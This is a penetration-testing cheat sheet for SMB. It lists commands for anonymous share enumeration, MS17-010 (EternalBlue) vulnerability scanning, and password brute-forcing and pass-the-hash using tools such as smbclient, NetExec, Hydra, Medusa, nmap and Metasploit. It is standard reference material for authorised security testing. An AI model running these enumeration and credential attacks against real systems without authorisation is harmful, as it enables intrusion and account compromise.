# SMB

## 01 - Anonymous Login

### 1.1 - Manual

#### 1.1.1 - Samba Suite Utils

```
$ smbclient -N -L //<IP>

$ smbclient -u "%" -L //<IP>

$ smbclient -u "guest%" -L //<IP>

$ smbclient -N -L //<IP> -m SMB2

$ smbclient -N -L //<IP> -m SMB3
```

#### 1.1.2 - Impacket

```
$ smbclient.py -no-pass [<domain>/]''@<IP>

$ smbclient.py -no-pass [<domain>/]guest@<IP>
```

#### 1.1.3 - SMBMap

```
$ smbmap -u "" -p "" -H <IP> [-P <PORT>]

$ smbmap -u "guest" -p "" -H <IP> [-P <PORT>]
```

#### 1.1.4 - Enum4Linux

```
$ enum4linux-ng -A -u "" -p "" <IP>

$ enum4linux-ng -A -u "guest" -p "" <IP>
```

#### 1.1.5 - NetExec

```
$ netexec smb <IP>/<CIDR> [-d <domain> | --local-auth] --shares

$ netexec smb <IP>/<CIDR> -u "guest" -p "" [-d <domain> | --local-auth] --shares
```

### 1.2 - Automated

#### 1.2.1 - Network Mapper

```
$ nmap -p 445 -Pn -n --script smb-os-discovery,smb-enum-shares,smb-enum-domains <IP>

$ nmap -p 445 -Pn -n --script smb-os-discovery,smb-enum-shares,smb-enum-domains -iL ip_targets.txt
```

#### 1.2.2 - Nuclei

```
$ nuclei -l ip_targets.txt -t ~/nuclei-templates -id smb-anonymous-access
```

## 02 - RCE

### 2.1 - EternalBlue

#### 2.1.1 - Network Mapper

```
$ nmap -p 445 -Pn -n --script smb-vuln-ms17-010 <IP>

$ nmap -p 445 -Pn -n --open --max-hostgroup 3 --script smb-vuln-ms17-010 -iL ip_targets.txt
```

#### 2.1.2 - Metasploit

```
msf > use auxiliary/scanner/smb/smb_ms17_010

msf auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                              Required  Description
   ----         ---------------                                              --------  -----------
   CHECK_ARCH   true                                                         no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                         no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                        no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.  yes       List of named pipes to check
                txt
   RHOSTS                                                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        445                                                          yes       The SMB service port (TCP)
   SMBDomain    .                                                            no        The Windows domain to use for authentication
   SMBPass                                                                   no        The password for the specified username
   SMBUser                                                                   no        The username to authenticate as
   THREADS      1                                                            yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf auxiliary(scanner/smb/smb_ms17_010) > set check_arch <true | false>

msf auxiliary(scanner/smb/smb_ms17_010) > set check_dopu <true | false>

msf auxiliary(scanner/smb/smb_ms17_010) > set check_pipe [true | false]

msf auxiliary(scanner/smb/smb_ms17_010) > set threads 8

msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts <<IP>/<CIDR> | file:/path/to/ip_targets.txt>

msf auxiliary(scanner/smb/smb_ms17_010) > run
```

## 03 - Brute Force

### 3.1 - Hydra

```
$ hydra -U smb

$ hydra -V -l Administrator -p <password> smb://<IP>
```

Pass the Hash

```
$ hydra -V -l <username> -p <nt_hash> -m "" <IP> smb

$ hydra -V -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb
```

### 3.2 - Medusa

```
$ medusa -u <username> -p <password> -h <IP> -M smb
```

Pass the Hash

> [!WARNING]
> Be careful of mass domain account lockout with this module. For example, assume you are checking several accounts against many domain workstations. If you are using either the `GROUP:DOMAIN` or the `GROUP:BOTH` option and these accounts do not exist locally on the workstations, each workstation will in turn check their respective domain controller. This could cause a bunch of lockouts. 

```
$ medusa -u <username> -p <lm_hash>:<nt_hash> -h <IP> -M smbnt -m PASS:HASH
```

### 3.3 - Network Mapper

```
$ nmap -p 445 -Pn -n --script smb-brute --script-args "userdb=users.lst,passdb=passwords.lst" [--script-args smbtype=<version>] <IP>

$ nmap -p 445 -Pn -n --script smb-brute --script-args "smbusername='Administrator',passdb=passwords.lst" [--script-args smbtype=<version>] <IP>
```

### 3.4 - Metasploit

You can actually use NTLM hashes to pass the hash.

```
msf > use auxiliary/scanner/smb/smb_login

msf auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf auxiliary(scanner/smb/smb_login) > set user_file users.lst

msf auxiliary(scanner/smb/smb_login) > set pass_file passwords.lst

msf auxiliary(scanner/smb/smb_login) > set threads 8

msf auxiliary(scanner/smb/smb_login) > run
```

---
## References

### Source Repositories

- [Enum4Linux-NG](https://github.com/cddmp/enum4linux-ng)

### Medusa

- [Medusa Parallel Network Login Auditor :: SMBNT]([http://www.foofus.net/~jmk/medusa/medusa-smbnt.html](https://web.archive.org/web/20170701085449/http://foofus.net/goons/jmk/medusa/medusa-smbnt.html))

### Hacking Articles

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)

### Penetration Testing Tools

- [Penetration Testing Tools: Hydra Protocols](https://en.kali.tools/?p=220)